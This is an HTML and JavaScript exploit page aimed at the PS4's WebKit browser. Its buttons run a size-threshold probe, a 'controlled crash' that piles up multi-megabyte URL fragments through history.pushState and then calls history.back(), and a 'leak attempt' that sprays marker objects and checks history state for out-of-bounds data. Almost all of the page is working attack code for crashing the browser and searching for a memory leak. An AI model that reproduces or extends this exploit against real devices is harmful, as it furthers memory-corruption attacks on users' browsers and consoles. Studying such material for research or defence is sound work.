<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit â€“ Controlled Fragment Overflow</title>
<style>
body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
button { 
  display: block; 
  margin: 10px 0; 
  padding: 12px 20px; 
  background: #2a2a2a; 
  color: #0f0; 
  border: 1px solid #0f0;
  cursor: pointer;
  font-size: 14px;
}
button:hover { background: #3a3a3a; }
#log { 
  margin-top: 20px; 
  white-space: pre-wrap; 
  font-size: 12px;
  border-top: 1px solid #0f0;
  padding-top: 10px;
  max-height: 600px;
  overflow-y: auto;
}
.critical { color: #ff0; }
.success { color: #0ff; }
.warn { color: #f80; }
</style>
</head>
<body>
<h2>PS4 WebKit â€“ Controlled Fragment Size Exploit</h2>
<button onclick="runSizeProbe()">PROBE â€“ Find exact threshold</button>
<button onclick="runControlledCrash()">EXPLOIT â€“ Controlled crash point</button>
<button onclick="runLeakAttempt()">LEAK â€“ Attempt data leak before crash</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

let heap = [];
let popstateCount = 0;
let totalFragmentSize = 0;

window.addEventListener("popstate", (e) => {
  popstateCount++;
  const state = e.state ? JSON.stringify(e.state).slice(0,80) : "null";
  const hashLen = location.hash.length;
  log(`[POPSTATE #${popstateCount}] state=${state}, hash.length=${hashLen}`, "success");
});

// -------------------------------------------------
// PROBE â€“ Binary search for exact threshold
// -------------------------------------------------
async function runSizeProbe(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  totalFragmentSize = 0;
  
  log("=== SIZE THRESHOLD PROBE ===", "critical");
  log("Strategy: Binary search for crash threshold\n");
  
  // Test different total sizes
  const testSizes = [
    { entries: 10, size: 500000 },   // 5 MB total
    { entries: 10, size: 400000 },   // 4 MB total  
    { entries: 10, size: 300000 },   // 3 MB total
    { entries: 10, size: 200000 },   // 2 MB total
    { entries: 10, size: 100000 }    // 1 MB total
  ];
  
  for(const test of testSizes){
    log(`\n[TEST] ${test.entries} entries Ã— ${test.size} bytes = ${(test.entries * test.size / 1024 / 1024).toFixed(2)} MB`, "warn");
    
    totalFragmentSize = 0;
    for(let i=0; i<test.entries; i++){
      const fragment = "P".repeat(test.size);
      totalFragmentSize += test.size;
      
      history.pushState({
        test: "probe",
        entry: i,
        size: test.size
      }, "", "#"+fragment);
      
      await sleep(2);
    }
    
    log(`  Total accumulated: ${(totalFragmentSize / 1024 / 1024).toFixed(2)} MB`);
    log(`  Triggering back()...`, "critical");
    
    await sleep(50);
    history.back();
    await sleep(100);
    
    log(`  âœ“ Survived`, "success");
    
    // Clear for next test
    for(let i=0; i<test.entries-1; i++){
      history.back();
      await sleep(1);
    }
  }
  
  log("\n=== PROBE COMPLETE ===");
  log(`If this completed, threshold is > 5 MB`, "warn");
}

// -------------------------------------------------
// CONTROLLED CRASH â€“ Target exact size
// -------------------------------------------------
async function runControlledCrash(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  totalFragmentSize = 0;
  
  log("=== CONTROLLED CRASH TEST ===", "critical");
  log("Strategy: Build to threshold, then trigger with controlled data\n");
  
  // Phase 1: Build up close to threshold with small entries
  log("[PHASE 1] Building base with small entries");
  const BASE_ENTRIES = 40;
  const SMALL_SIZE = 1000;
  
  for(let i=0; i<BASE_ENTRIES; i++){
    const fragment = String.fromCharCode(65 + (i % 26)).repeat(SMALL_SIZE);
    totalFragmentSize += SMALL_SIZE;
    
    history.pushState({
      phase: 1,
      entry: i,
      marker: String.fromCharCode(65 + (i % 26))
    }, "", "#"+fragment);
    
    if(i % 10 === 0) log(`  Entry ${i}: ${(totalFragmentSize / 1024).toFixed(1)} KB total`);
    await sleep(2);
  }
  
  log(`\n[PHASE 2] Adding critical-size entries`, "warn");
  
  // Phase 2: Add progressively larger entries
  const criticalSizes = [100000, 200000, 300000, 400000, 500000];
  
  for(let i=0; i<criticalSizes.length; i++){
    const size = criticalSizes[i];
    const marker = "CRITICAL_" + i;
    const fragment = "X".repeat(size);
    
    totalFragmentSize += size;
    
    log(`  Entry ${BASE_ENTRIES + i}: ${marker} (${(size/1024).toFixed(0)} KB) â†’ Total: ${(totalFragmentSize/1024/1024).toFixed(2)} MB`, "critical");
    
    history.pushState({
      phase: 2,
      entry: BASE_ENTRIES + i,
      marker: marker,
      size: size
    }, "", "#"+fragment);
    
    await sleep(50);
    
    // Try back() after each large entry
    log(`    Testing back()...`);
    history.back();
    await sleep(100);
    
    if(popstateCount > 0){
      log(`    âœ“ Back survived, popstate received`, "success");
      popstateCount = 0;
      
      // Go forward again
      history.forward();
      await sleep(50);
    }
  }
  
  log("\n=== CONTROLLED CRASH END ===");
}

// -------------------------------------------------
// LEAK ATTEMPT â€“ Try to read OOB before crash
// -------------------------------------------------
async function runLeakAttempt(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  totalFragmentSize = 0;
  
  log("=== LEAK ATTEMPT ===", "critical");
  log("Strategy: Fill history, spray objects, observe data in popstate\n");
  
  // Spray recognizable objects
  log("[SPRAY] Creating marker objects");
  const MARKER = "LEAK_MARKER_";
  const spray = [];
  for(let i=0; i<500; i++){
    spray.push({
      id: i,
      marker: MARKER + i.toString(16).padStart(8, "0"),
      padding: "Z".repeat(1000)
    });
  }
  log(`  Created ${spray.length} spray objects with markers`);
  
  await sleep(50);
  
  // Build history with controlled sizes
  log("\n[FILL] Building history");
  const sizes = [];
  let size = 1000;
  
  for(let i=0; i<30; i++){
    const fragment = "H".repeat(size);
    totalFragmentSize += size;
    sizes.push(size);
    
    history.pushState({
      entry: i,
      expectedSize: size,
      total: totalFragmentSize
    }, "", "#"+fragment);
    
    if(i % 5 === 0) log(`  Entry ${i}: ${(totalFragmentSize/1024/1024).toFixed(2)} MB total`);
    
    size += 50000; // Grow 50 KB per entry
    await sleep(2);
  }
  
  log(`\n[TRIGGER] Executing back() chain`, "warn");
  
  // Execute multiple backs and check state
  for(let i=0; i<10; i++){
    await sleep(50);
    
    const beforeHash = location.hash.length;
    log(`\nBack #${i+1}: current hash length = ${beforeHash}`);
    
    history.back();
    await sleep(100);
    
    const afterHash = location.hash.length;
    log(`  After: hash length = ${afterHash}`);
    
    // Check if hash contains spray marker
    if(location.hash.includes(MARKER)){
      log(`  ðŸš¨ LEAK DETECTED: Hash contains spray marker!`, "critical");
      const idx = location.hash.indexOf(MARKER);
      log(`  Leaked data: ${location.hash.slice(idx, idx+50)}`, "critical");
    }
    
    // Check state object
    if(window.history.state){
      const stateStr = JSON.stringify(window.history.state);
      if(stateStr.includes(MARKER)){
        log(`  ðŸš¨ LEAK DETECTED: State contains spray marker!`, "critical");
        log(`  State: ${stateStr.slice(0, 200)}`, "critical");
      }
    }
  }
  
  log("\n=== LEAK ATTEMPT END ===");
}

log("Ready. Tests ordered by increasing risk:");
log("1. PROBE - safest, finds threshold");
log("2. EXPLOIT - medium risk, controlled crash");
log("3. LEAK - highest risk, attempts data leak");
</script>
</body>
</html>
